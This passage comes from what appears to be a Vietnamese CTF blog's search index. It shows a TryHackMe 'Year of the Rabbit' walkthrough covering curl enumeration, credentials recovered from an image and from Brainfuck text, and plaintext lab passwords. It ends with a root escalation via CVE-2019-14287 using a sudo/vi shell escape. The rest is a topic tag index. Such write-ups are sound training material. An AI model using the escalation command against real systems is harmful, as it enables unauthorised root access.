intermediary . php ? hidden_directory =/ WExYY2Cv-qU < Content-Length : 0 < Content-Type : text / html ; charset = UTF - 8 < * Connection #0 to host 10.10.25.94 left intact Ta th\u1ea5y n\u00f3 c\u00f3 1 folder \u1ea9n l\u00e0 WExYY2Cv-qU . C\u1ee9 curl ti\u1ebfp Curl \u2514\u2500 $ curl http :// 10 . 10 . 25 . 94 / WExYY2Cv-qU / -v * Trying 10 . 10 . 25 . 94 : 80 ... * Connected to 10 . 10 . 25 . 94 ( 10 . 10 . 25 . 94 ) port 80 ( #0) > GET / WExYY2Cv-qU / HTTP / 1 . 1 > Host : 10 . 10 . 25 . 94 > User-Agent : curl / 7 . 88 . 1 > Accept : */* > < HTTP / 1 . 1 200 OK < Date : Fri , 01 Sep 2023 16 : 34 : 27 GMT < Server : Apache / 2 . 4 . 10 ( Debian ) < Vary : Accept-Encoding < Content-Length : 954 < Content-Type : text / html ; charset = UTF - 8 < <! DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\" > < html > < head > < title > Index of / WExYY2Cv-qU </ title > </ head > < body > < h1 > Index of / WExYY2Cv-qU </ h1 > < table > < tr >< th valign = \"top\" >< img src = \"/icons/blank.gif\" alt = \"[ICO]\" ></ th >< th >< a href = \"?C=N;O=D\" > Name </ a ></ th >< th >< a href = \"?C=M;O=A\" > Last modified </ a ></ th >< th >< a href = \"?C=S;O=A\" > Size </ a ></ th >< th >< a href = \"?C=D;O=A\" > Description </ a ></ th ></ tr > < tr >< th colspan = \"5\" >< hr ></ th ></ tr > < tr >< td valign = \"top\" >< img src = \"/icons/back.gif\" alt = \"[PARENTDIR]\" ></ td >< td >< a href = \"/\" > Parent Directory </ a ></ td >< td >& nbsp ;</ td >< td align = \"right\" > - </ td >< td >& nbsp ;</ td ></ tr > < tr >< td valign = \"top\" >< img src = \"/icons/image2.gif\" alt = \"[IMG]\" ></ td >< td >< a href = \"Hot_Babe.png\" > Hot_Babe . png </ a ></ td >< td align = \"right\" > 2020 - 01 - 23 00 : 34 </ td >< td align = \"right\" > 464K </ td >< td >& nbsp ;</ td ></ tr > < tr >< th colspan = \"5\" >< hr ></ th ></ tr > </ table > < address > Apache / 2 . 4 . 10 ( Debian ) Server at 10 . 10 . 25 . 94 Port 80 </ address > </ body ></ html > * Connection #0 to host 10.10.25.94 left intact Ta nh\u1eadn \u0111\u01b0\u1ee3c file Hot_Babe.png . \u0110\u01b0\u1ee3c r\u1ed3i ta s\u1ebd get file v\u1ec1. V\u1edbi strings, ta th\u1ea5y r\u1eb1ng \u0111o\u1ea1n sau c\u1ee7a file \u1ea3nh hi\u1ec3n th\u1ecb th\u00f4ng tin username v\u00e0 password cho vi\u1ec7c login b\u1eb1ng ftp Ta s\u1ebd d\u00f9ng hydra \u0111\u1ec3 brute force password No.... user: ftpuser pass: 5iez1wGXKfPKQ Login ftp th\u00f4i, ta s\u1ebd \u0111\u01b0\u1ee3c th\u00eam 1 \u0111o\u1ea1n text m\u1edbi +++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->- --<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+ ++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+ +++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++< ]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+ ++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->--- --<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++ +<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+ ++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++ <]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++ <]>+. <+++[ ->--- <]>-- ---.- ----. < \u0110\u00e2y l\u00e0 th\u00f4ng \u0111i\u1ec7p \u0111\u01b0\u1ee3c m\u00e3 h\u00f3a b\u1eb1ng Brainfuck. D\u00f9ng c\u00e1c website decode tr\u00ean m\u1ea1ng ta \u0111\u01b0\u1ee3c th\u00f4ng tin login ssh User: eli Password: DSpDiM1wAEwid","title":"Reconnaissance"},{"location":"tryhackme/room/yearoftherabbit/#init-access","text":"Sau khi login ssh ta th\u1ea5y \u0111\u01b0\u1ee3c hint c\u0169ng kh\u00e1 c\u00f3 \u00fd ngh\u0129a Hint Hint n\u00f3i r\u1eb1ng c\u00f3 m\u1ed9t file s3cr3t n\u00e0o \u0111\u00f3, t\u00ecm th\u00f4ng tin file b\u1eb1ng find Your password is awful , Gwendoline . It should be at least 60 characters long ! Not just MniVCQVhQHUNI Honestly ! Yours sincerely -Root password for user gwendoline is MniVCQVhQHUNI Ti\u1ebfp t\u1ee5c login v\u1edbi user gwendoline... Sudo -l gwendoline @year -of-the-rabbit :~$ sudo -l Matching Defaults entries for gwendoline on year-of-the-rabbit : env_reset , mail_badpass , secure_path =/ usr / local / sbin \\:/ usr / local / bin \\:/ usr / sbin \\:/ usr / bin \\:/ sbin \\:/ bin User gwendoline may run the following commands on year-of-the-rabbit : ( ALL , ! root ) NOPASSWD : / usr / bin / vi / home / gwendoline / user . txt Searchsploit ta th\u1ea5y k\u1ebft qu\u1ea3 \u0111\u00e2y l\u00e0 CVE-2019-14287","title":"Init Access"},{"location":"tryhackme/room/yearoftherabbit/#privilege-escalation","text":"D\u1ef1a v\u00e0 m\u00f4 t\u1ea3 c\u1ee7a CVE-2019-14287 nh\u01b0 tr\u00ean, ta d\u1ec5 d\u00e0ng leo quy\u1ec1n root sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt :!/bin/sh","title":"Privilege Escalation"},{"location":"tryhackme/room/yearoftherabbit/#what-we-learned","text":"Disable Javascript Brainfuck CVE-2019-14287","title":"What we learned"},{"location":"tryhackme/room/yotf/","tags":["THM-Room","Privilege Escalation"],"text":"Year of the Fox \u00b6 Room at https://tryhackme.com/room/yotf List of the questions solved Question: name name Pentest scenario \u00b6 Reconnaissance \u00b6 Init Access \u00b6 Privilege Escalation \u00b6 What we learned \u00b6","title":"Year of the Fox"},{"location":"tryhackme/room/yotf/#year-of-the-fox","text":"Room at https://tryhackme.com/room/yotf List of the questions solved Question: name name","title":"Year of the Fox"},{"location":"tryhackme/room/yotf/#pentest-scenario","text":"","title":"Pentest scenario"},{"location":"tryhackme/room/yotf/#reconnaissance","text":"","title":"Reconnaissance"},{"location":"tryhackme/room/yotf/#init-access","text":"","title":"Init Access"},{"location":"tryhackme/room/yotf/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"tryhackme/room/yotf/#what-we-learned","text":"","title":"What we learned"},{"location":"tags/tags/","text":"Categories \u00b6 247CTF \u00b6 NAME Acid flag Bank Administrative Orm Compare the pair Flag Authoriser Forgotten File Pointer Secured Session Slippery Upload The Twig Injector Trusted Client Authorisation Bypass \u00b6 Authorisation Bypass Authorisation Bypass Brute Force \u00b6 Brute Force CSP \u00b6 CSP Bypass CSRF \u00b6 Cross Site Request Forgery CVE-2019-14287 \u00b6 Year of the Rabbit Cyber Kill Chain \u00b6 Cyber Kill Chain DVWA \u00b6 Authorisation Bypass Authorisation Bypass Brute Force Command Injection Cross Site Request Forgery CSP Bypass File Inclusion File Upload JavaScript Open HTTP Redirect SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS Reflected XSS Stored Investigating Windows \u00b6 Investigating Windows JavaScript \u00b6 JavaScript Linux \u00b6 Linux Privilege Escalation Linux Privilege Escalation \u00b6 Root Me Open HTTP Redirect \u00b6 Open HTTP Redirect Privilege Escalation \u00b6 Linux Privilege Escalation Windows Privilege Escalation Name Athena Basic Pentesting Blog Brooklyn Nine Nine Brute It Cyborg Simple CTF Grep Ignite LazyAdmin Lesson Learned? Lian_Yu Relevant Skynet Startup tomghost CTF Wgel Wonderland Year of the Rabbit Year of the Fox Red Teaming - Post Compromise \u00b6 Windows Local Persistence Reverse Shell \u00b6 Reverse Shell Cheatsheet SQL Injection \u00b6 Simple CTF THM-Room \u00b6 Name Athena Basic Pentesting Blog Brooklyn Nine Nine Brute It Cyborg Simple CTF TryHackMe - Empire Enumeration Grep Hydra Ignite TryHackMe - Intro to C2 Investigating Windows Cyber Kill Chain TryHackMe - Hacking with Powershell - Walkthrough Init Access Weaponization The Lay of the Land Windows Local Persistence LazyAdmin Lesson Learned? Lian_Yu TryHackMe - Metasploit Relevant Password Attacks Phishing Printer Hacking 101 Root Me Skynet Startup tomghost Traverse CTF Wgel Wonderland Year of the Rabbit Year of the Fox Weak Session IDs \u00b6 Weak Session IDs Windows \u00b6 Windows Privilege Escalation XSS \u00b6 XSS (DOM) XSS Reflected XSS Stored XSS DOM \u00b6 XSS (DOM) XSS Reflected \u00b6 XSS Reflected XSS Stored \u00b6 XSS Stored","title":"Categories"},{"location":"tags/tags/#categories","text":"","title":"Categories"},{"location":"tags/tags/#247ctf","text":"NAME Acid flag Bank Administrative Orm Compare the pair Flag Authoriser Forgotten File Pointer Secured Session Slippery Upload The Twig Injector Trusted Client","title":"247CTF"},{"location":"tags/tags/#authorisation-bypass","text":"Authorisation Bypass Authorisation Bypass","title":"Authorisation Bypass"},{"location":"tags/tags/#brute-force","text":"Brute Force","title":"Brute Force"},{"location":"tags/tags/#csp","text":"CSP Bypass","title":"CSP"},{"location":"tags/tags/#csrf","text":"Cross Site Request Forgery","title":"CSRF"},{"location":"tags/tags/#cve-2019-14287","text":"Year of the Rabbit","title":"CVE-2019-14287"},{"location":"tags/tags/#cyber-kill-chain","text":"Cyber Kill Chain","title":"Cyber Kill Chain"},{"location":"tags/tags/#dvwa","text":"Authorisation Bypass Authorisation Bypass Brute Force Command Injection Cross Site Request Forgery CSP Bypass File Inclusion File Upload JavaScript Open HTTP Redirect SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS Reflected XSS Stored","title":"DVWA"},{"location":"tags/tags/#investigating-windows","text":"Investigating Windows","title":"Investigating Windows"},{"location":"tags/tags/#javascript","text":"JavaScript","title":"JavaScript"},{"location":"tags/tags/#linux","text":"Linux Privilege Escalation","title":"Linux"},{"location":"tags/tags/#linux-privilege-escalation","text":"Root Me","title":"Linux Privilege Escalation"},{"location":"tags/tags/#open-http-redirect","text":"Open HTTP Redirect","title":"Open HTTP Redirect"},{"location":"tags/tags/#privilege-escalation","text":"Linux Privilege Escalation Windows Privilege Escalation Name Athena Basic Pentesting Blog Brooklyn Nine Nine Brute It Cyborg Simple CTF Grep Ignite LazyAdmin Lesson Learned? Lian_Yu Relevant Skynet Startup tomghost CTF Wgel Wonderland Year of the Rabbit Year of the Fox","title":"Privilege Escalation"},{"location":"tags/tags/#red-teaming-post-compromise","text":"Windows Local Persistence","title":"Red Teaming - Post Compromise"},{"location":"tags/tags/#reverse-shell","text":"Reverse Shell Cheatsheet","title":"Reverse Shell"},{"location":"tags/tags/#sql-injection","text":"Simple CTF","title":"SQL Injection"},{"location":"tags/tags/#thm-room","text":"Name Athena Basic Pentesting Blog Brooklyn Nine Nine Brute It Cyborg Simple CTF TryHackMe - Empire Enumeration Grep Hydra Ignite TryHackMe - Intro to C2 Investigating Windows Cyber Kill Chain TryHackMe - Hacking with Powershell - Walkthrough Init Access Weaponization The Lay of the Land Windows Local Persistence LazyAdmin Lesson Learned? Lian_Yu TryHackMe - Metasploit Relevant Password Attacks Phishing Printer Hacking 101 Root Me Skynet Startup tomghost Traverse CTF Wgel Wonderland Year of the Rabbit Year of the Fox","title":"THM-Room"},{"location":"tags/tags/#weak-session-ids","text":"Weak Session IDs","title":"Weak Session IDs"},{"location":"tags/tags/#windows","text":"Windows Privilege Escalation","title":"Windows"},{"location":"tags/tags/#xss","text":"XSS (DOM) XSS Reflected XSS Stored","title":"XSS"},{"location":"tags/tags/#xss-dom","text":"XSS (DOM)","title":"XSS DOM"},{"location":"tags/tags/#xss-reflected","text":"XSS Reflected","title":"XSS Reflected"},{"location":"tags/tags/#xss-stored","text":"XSS Stored","title":"XSS Stored"}]}